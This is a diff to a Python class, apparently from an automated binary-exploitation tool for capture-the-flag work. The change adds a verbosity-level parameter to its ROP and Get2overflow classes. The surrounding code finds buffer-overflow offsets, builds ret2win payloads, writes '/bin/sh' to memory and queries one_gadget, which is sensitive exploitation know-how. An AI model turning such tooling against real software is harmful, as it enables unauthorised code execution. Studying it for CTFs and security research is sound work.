@@ -7,15 +7,16 @@ import os
 from Print import Print
 
 class ROP:
-    def __init__(self, analysis):
+    def __init__(self, analysis, v_lvl):
         self.analysis = analysis
         self.filename = analysis.binary
+        self.v_lvl = v_lvl
         self.offset = self.set_offset()
         self.e = ELF(self.filename)
         self.gadgets = []
         self.find_gadgets()
         self.libc = "/opt/libc.so.6"
-        self.fart_print = Print(quiet=True)
+        self.fart_print = Print(v_lvl)
 
     def write_binsh_to_mem(self):
         angr_proj = angr.Project(self.analysis.binary)
@@ -62,7 +63,7 @@ class ROP:
             os.remove(core.file.name)
             return b'A'*cyclic_find(core.read(core.rsp, 8), n=8)
         except PwnlibException as e:
-            return Get2overflow(self.filename).buf()
+            return Get2overflow(self.filename, self.v_lvl).buf()
 
     def ret2win(self, failed):
         payload = self.offset
@@ -242,8 +243,8 @@ class ROP:
           return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', self.libc]).decode().split(' ')]
 
 class Get2overflow:
-    def __init__(self, binary):
-        self.fart_print = Print(quiet=True)
+    def __init__(self, binary, v_lvl):
+        self.fart_print = Print(v_lvl)
         self.elf = context.binary =  ELF(binary)
         self.proj = angr.Project(binary)
         start_addr = self.elf.sym["main"]
